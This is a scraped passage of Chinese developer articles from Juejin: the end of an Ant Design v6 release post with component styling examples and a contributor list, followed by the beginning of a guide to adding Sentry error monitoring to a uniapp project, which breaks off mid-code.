  <span class="hljs-tag">&lt;<span class="hljs-name">App</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">ConfigProvider</span>&gt;</span></span>
</code></pre>
<h4 data-id="heading-7">俏皮图标按钮</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Button</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">'rounded-tr-xl rounded-bl-xl'</span>,
    <span class="hljs-attr">icon</span>: <span class="hljs-string">'rotate-30'</span>,
  }}
  icon={<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">SmileOutlined</span> /&gt;</span></span>}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span>
&lt;/<span class="hljs-title class_">Button</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0048cfdcc71c47deaa8d6813bb256a0f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=kBJ4uC5EJRqwFymnEDJsuRufg2Y%3D" alt="Funny" loading="lazy"/></p>
<h4 data-id="heading-8">极客风卡片</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;<span class="hljs-title class_">Card</span>
  title=<span class="hljs-string">"Hello World"</span>
  classNames={{
    <span class="hljs-attr">root</span>: <span class="hljs-string">"bg-green-300/10 text-green-500 border-green-500 rounded-none [box-shadow:0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">header</span>: <span class="hljs-string">"rounded-none border-green-500 [box-shadow:inset_0_0_8px_theme(colors.green.500)]"</span>,
    <span class="hljs-attr">title</span>:
      <span class="hljs-string">"text-green-500 [text-shadow:0_0_12px_theme(colors.green.400)] overflow-visible"</span>,
      <span class="hljs-attr">body</span>: <span class="hljs-string">"rounded-none [text-shadow:0_0_8px_theme(colors.green.400)] [box-shadow:inset_0_0_12px_theme(colors.green.500)]"</span>
  }}
&gt;
  <span class="hljs-title class_">Ant</span> <span class="hljs-title class_">Design</span> loves you!~ (=^・ω・^)
&lt;/<span class="hljs-title class_">Card</span>&gt;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c379d0325d8244a2a449dceac39ffb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=2%2FBVdMSUSor%2FPahE16xfFE7A8IM%3D" alt="Geek Green" loading="lazy"/></p>
<h3 data-id="heading-9">🚫 移除 v4 废弃 API</h3>
<p>v6 移除了在 v4 废弃、v5 保留兼容的所有 API：</p>
<ul>
<li><code>findDOMNode</code> 兼容逻辑移除。</li>
<li><strong>List</strong>、<strong>Dropdown.Button</strong>、<strong>BackTop</strong> 文档移除但保留兼容。</li>
<li>React 18 兼容代码删除（直接支持 18）。</li>
<li>统一 API 命名风格，兼容 v5 所有 API。</li>
</ul>
<h2 data-id="heading-10">新组件与功能增强</h2>
<h3 data-id="heading-11">🔥 Masonry 瀑布流组件</h3>
<p>用于图片展示、卡片流等场景：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9422f1c5214648d4a5428eadaf324f51~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=fZW0VVbxTyvTWTSx6FjBHB4vHUA%3D" alt="Masonry" loading="lazy"/></p>
<h3 data-id="heading-12">🔥 Tooltip 支持平移滑动</h3>
<p>在多个提示内容之间开启平移滑动：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e742cda3d834516b80ba9fc7c8f69cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=vVlXMk5e7nfEq3cr6J7CF0zjejM%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">🆕 InputNumber <code>spinner</code> 模式</h3>
<p>常见的按钮平铺样式，便于用户直接点击交互：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c478906c3f1b40d5ab174a325fe62d01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=4ZGqSqtmjSqzKKeQeyJvr0%2BzjR0%3D" alt="Spinner InputNumber" loading="lazy"/></p>
<h3 data-id="heading-14">🆕 Drawer 支持拖拽</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60a53e5d900542ebbae10b8a4e4b2ce9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GLSlQLCWes16xxt3aRNYXSCc5SM%3D" alt="Resizable Drawer" loading="lazy"/></p>
<h3 data-id="heading-15">🎨 蒙版模糊背景</h3>
<p>所有弹层默认使用模糊效果，可通过 <code>mask: { blur: false }</code> 关闭：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9bfa07fa9a524614801832e7ebc7621b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=Nv%2FYjwuFhll18o6nKHFs4BNswfg%3D" alt="Blur Mask" loading="lazy"/></p>
<h2 data-id="heading-16">升级指南</h2>
<ul>
<li>v6 对 v5 完全兼容，可直接升级。
<ul>
<li>建议按警告替换废弃 API。</li>
</ul>
</li>
<li>项目需运行在 <strong>React 18 或更高版本</strong>。</li>
<li>不再支持 <strong>IE</strong>。</li>
</ul>
<h2 data-id="heading-17">未来计划</h2>
<ul>
<li>优化移动端交互体验。</li>
<li>增强无障碍（Accessibility）支持。</li>
<li>跟进 React 新特性提升性能。</li>
<li>更多新组件开发中，敬请期待。</li>
</ul>
<h2 data-id="heading-18">One More Thing</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b789e7d0d6b4445b1887885f8a03fe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=zn8tZHe6EAVFgb27FaHQsIU9ddM%3D" alt="Ant Design X 2.0" loading="lazy"/></p>
<p>🚀 Ant Design X 同步发布 2.0 版本。作为 Ant Design 面向 AI 场景的组件库，新版本带来了更强大的交互与渲染能力。如果你正在探索 AI 驱动的界面体验，现在就是最佳时机：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fant-design%2Fx%2Fissues%2F1358" target="_blank" title="https://github.com/ant-design/x/issues/1358" ref="nofollow noopener noreferrer">🎉 Ant Design X 2.0 正式发布了 🎉</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21e252f7d385437a9647cd0b8ab4e1f8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgem9tYmllSg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764560230&amp;x-signature=GsfiWfHcXL0L1Ww8S1gUwNb1Xkk%3D" alt="LUI" loading="lazy"/></p>
<h2 data-id="heading-19">写在最后</h2>
<p>Ant Design 自第一行代码以来，经历了 10 个年头。我们希望在 AI 浪潮之下，Ant Design 仍然是你的最好伙伴。感谢为 v6 付出的各位朋友。 —— 因为你们的参与，开源才如此美好：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F984507092" target="_blank" title="https://github.com/984507092" ref="nofollow noopener noreferrer">984507092</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fafc163" target="_blank" title="https://github.com/afc163" ref="nofollow noopener noreferrer">afc163</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faojunhao123" target="_blank" title="https://github.com/aojunhao123" ref="nofollow noopener noreferrer">aojunhao123</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FArktomson" target="_blank" title="https://github.com/Arktomson" ref="nofollow noopener noreferrer">Arktomson</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcactuser-Lu" target="_blank" title="https://github.com/cactuser-Lu" ref="nofollow noopener noreferrer">cactuser-Lu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fccc1018" target="_blank" title="https://github.com/ccc1018" ref="nofollow noopener noreferrer">ccc1018</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FcodewizardTM" target="_blank" title="https://github.com/codewizardTM" ref="nofollow noopener noreferrer">codewizardTM</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoding-ice" target="_blank" title="https://github.com/coding-ice" ref="nofollow noopener noreferrer">coding-ice</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcrazyair" target="_blank" title="https://github.com/crazyair" ref="nofollow noopener noreferrer">crazyair</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdivyeshagrawal" target="_blank" title="https://github.com/divyeshagrawal" ref="nofollow noopener noreferrer">divyeshagrawal</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felrrrrrrr" target="_blank" title="https://github.com/elrrrrrrr" ref="nofollow noopener noreferrer">elrrrrrrr</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEmilyyyLiu" target="_blank" title="https://github.com/EmilyyyLiu" ref="nofollow noopener noreferrer">EmilyyyLiu</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffireairforce" target="_blank" title="https://github.com/fireairforce" ref="nofollow noopener noreferrer">fireairforce</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FGinWU05" target="_blank" title="https://github.com/GinWU05" ref="nofollow noopener noreferrer">GinWU05</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fguoyunhe" target="_blank" title="https://github.com/guoyunhe" ref="nofollow noopener noreferrer">guoyunhe</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhcjlxl" target="_blank" title="https://github.com/hcjlxl" ref="nofollow noopener noreferrer">hcjlxl</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJeeekXY" target="_blank" title="https://github.com/JeeekXY" ref="nofollow noopener noreferrer">JeeekXY</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FJerryqun" target="_blank" title="https://github.com/Jerryqun" ref="nofollow noopener noreferrer">Jerryqun</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjin19980928" target="_blank" title="https://github.com/jin19980928" ref="nofollow noopener noreferrer">jin19980928</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjon-cullison" target="_blank" title="https://github.com/jon-cullison" ref="nofollow noopener noreferrer">jon-cullison</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkiner-tang" target="_blank" title="https://github.com/kiner-tang" ref="nofollow noopener noreferrer">kiner-tang</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fli-jia-nan" target="_blank" title="https://github.com/li-jia-nan" ref="nofollow noopener noreferrer">li-jia-nan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FLinkodt" target="_blank" title="https://github.com/Linkodt" ref="nofollow noopener noreferrer">Linkodt</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flovelts" target="_blank" title="https://github.com/lovelts" ref="nofollow noopener noreferrer">lovelts</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMadCcc" target="_blank" title="https://github.com/MadCcc" ref="nofollow noopener noreferrer">MadCcc</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmeet-student" target="_blank" title="https://github.com/meet-student" ref="nofollow noopener noreferrer">meet-student</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fnmsn" target="_blank" title="https://github.com/nmsn" ref="nofollow noopener noreferrer">nmsn</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FOysterD3" target="_blank" title="https://github.com/OysterD3" ref="nofollow noopener noreferrer">OysterD3</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FPsiphonc" target="_blank" title="https://github.com/Psiphonc" ref="nofollow noopener noreferrer">Psiphonc</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FSusuperli" target="_blank" title="https://github.com/Susuperli" ref="nofollow noopener noreferrer">Susuperli</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftanjiahao24" target="_blank" title="https://github.com/tanjiahao24" ref="nofollow noopener noreferrer">tanjiahao24</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fthinkasany" target="_blank" title="https://github.com/thinkasany" ref="nofollow noopener noreferrer">thinkasany</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fug-hero" target="_blank" title="https://github.com/ug-hero" ref="nofollow noopener noreferrer">ug-hero</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwanpan11" target="_blank" title="https://github.com/wanpan11" ref="nofollow noopener noreferrer">wanpan11</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWxh16144" target="_blank" title="https://github.com/Wxh16144" ref="nofollow noopener noreferrer">Wxh16144</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxkhanhan" target="_blank" title="https://github.com/xkhanhan" ref="nofollow noopener noreferrer">xkhanhan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyellowryan" target="_blank" title="https://github.com/yellowryan" ref="nofollow noopener noreferrer">yellowryan</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyoyo837" target="_blank" title="https://github.com/yoyo837" ref="nofollow noopener noreferrer">yoyo837</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzjr222" target="_blank" title="https://github.com/zjr222" ref="nofollow noopener noreferrer">zjr222</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FzombieJ" target="_blank" title="https://github.com/zombieJ" ref="nofollow noopener noreferrer">zombieJ</a><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FZyf665" target="_blank" title="https://github.com/Zyf665" ref="nofollow noopener noreferrer">Zyf665</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uniapp 项目接入 sentry监控]]></title>    <link>https://juejin.cn/post/7575937594350845995</link>    <guid>https://juejin.cn/post/7575937594350845995</guid>    <pubDate>2025-11-24T05:03:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350845995" data-draft-id="7575937594350829611" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uniapp 项目接入 sentry监控"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-24T05:03:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="半瓶神仙醋"/> <meta itemprop="url" content="https://juejin.cn/user/2538123586707662"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uniapp 项目接入 sentry监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2538123586707662/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    半瓶神仙醋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T05:03:51.000Z" title="Mon Nov 24 2025 05:03:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Sentry 接入使用文档</h2>
<h3 data-id="heading-1">📋 目录</h3>
<ul>
<li><a href="#%E6%A6%82%E8%BF%B0" title="#%E6%A6%82%E8%BF%B0">概述</a></li>
<li><a href="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85" title="#%E4%BE%9D%E8%B5%96%E5%AE%89%E8%A3%85">依赖安装</a></li>
<li><a href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE" title="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE">环境配置</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE" title="#%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE">核心配置</a></li>
<li><a href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B" title="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%B5%81%E7%A8%8B">初始化流程</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F" title="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F">使用方式</a></li>
<li><a href="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF" title="#%E9%94%99%E8%AF%AF%E4%B8%8A%E6%8A%A5%E5%9C%BA%E6%99%AF">错误上报场景</a></li>
<li><a href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94" title="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E5%85%B3%E8%81%94">用户信息关联</a></li>
<li><a href="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E" title="#%E5%B9%B3%E5%8F%B0%E5%B7%AE%E5%BC%82%E8%AF%B4%E6%98%8E">平台差异说明</a></li>
</ul>
<hr/>
<h3 data-id="heading-2">概述</h3>
<p>本项目使用 <code>sentry-uniapp</code> 进行错误监控和上报，支持 H5、小程序、APP 多平台。Sentry 会自动捕获未处理的异常，同时提供手动上报接口用于业务错误和异常。</p>
<h4 data-id="heading-3">核心特性</h4>
<ul>
<li>✅ 自动捕获全局异常</li>
<li>✅ HTTP 请求错误自动上报</li>
<li>✅ 业务错误码上报</li>
<li>✅ 用户信息关联</li>
<li>✅ 环境开关控制</li>
<li>✅ 多平台支持</li>
</ul>
<hr/>
<h3 data-id="heading-4">依赖安装</h3>
<p>项目已安装 Sentry 依赖包：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"dependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"sentry-uniapp"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.0.12"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">环境配置</h3>
<h4 data-id="heading-6">1. 环境变量配置</h4>
<p>在 <code>.env</code> 文件中配置 Sentry DSN：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Sentry DSN（必填，用于错误上报）</span>
VITE_SENTRY_DSN=https://your-sentry-dsn@sentry.io/project-id

<span class="hljs-comment"># 是否启用 Sentry（可选，默认从 profile 读取）</span>
VITE_SENTRY_ENABLE=<span class="hljs-literal">true</span>
</code></pre>
<p><strong>类型定义</strong> (<code>typings/env.d.ts</code>):</p>
<pre><code class="hljs language-36:39:typings/env.d.ts" lang="36:39:typings/env.d.ts">  /** Sentry DSN */
  readonly VITE_SENTRY_DSN?: string
  /** 是否启用 Sentry */
  readonly VITE_SENTRY_ENABLE?: 'true' | 'false'
</code></pre>
<h4 data-id="heading-7">2. Profile 配置</h4>
<p>在 <code>env-conf.ts</code> 中配置各环境的 Sentry 开关：</p>
<pre><code class="hljs language-15:33:env-conf.ts" lang="15:33:env-conf.ts">      // 是否启用Sentry
      SENTRY_ENABLE: true,
    },
    uat: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: false,
    },
    production: {
      DELETE_CONSOLE: false,
      SHOW_SOURCEMAP: false,
      APP_PROXY_ENABLE: false,
      CLIENT_TYPE_BUYER: 'buyer',
      CLIENT_TYPE_SELLER: 'seller',
      SENTRY_ENABLE: true,
    },
</code></pre>
<p><strong>配置说明</strong>：</p>
<ul>
<li><code>development</code>: 开发环境，默认启用</li>
<li><code>uat</code>: 测试环境，默认关闭</li>
<li><code>production</code>: 生产环境，默认启用</li>
</ul>
<hr/>
<h3 data-id="heading-8">核心配置</h3>
<h4 data-id="heading-9">Sentry 核心文件 (<code>src/sentry.ts</code>)</h4>
<p>这是 Sentry 的核心配置文件，提供了初始化、错误捕获、用户信息设置等功能。以下是完整的代码：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'sentry-uniapp'</span>
<span class="hljs-keyword">import</span> { profile } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/profile'</span>

<span class="hljs-comment">/**
 * 检查是否启用 Sentry
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isSentryEnabled</span>(<span class="hljs-params"/>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>
  <span class="hljs-comment">// 必须同时满足：profile 中启用开关为 true 且 DSN 已配置</span>
  <span class="hljs-keyword">return</span> profile.<span class="hljs-property">SENTRY_ENABLE</span> &amp;&amp; !!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>
}

<span class="hljs-comment">/**
 * 初始化 Sentry
 * 在 App.vue 的 onLaunch 中调用
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initSentry</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">VITE_SENTRY_DSN</span> } = <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>

  <span class="hljs-comment">// 检查是否启用</span>
  <span class="hljs-keyword">if</span> (!profile.<span class="hljs-property">SENTRY_ENABLE</span>) {
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// 检查 DSN 是否配置</span>
  <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">VITE_SENTRY_DSN</span>) {
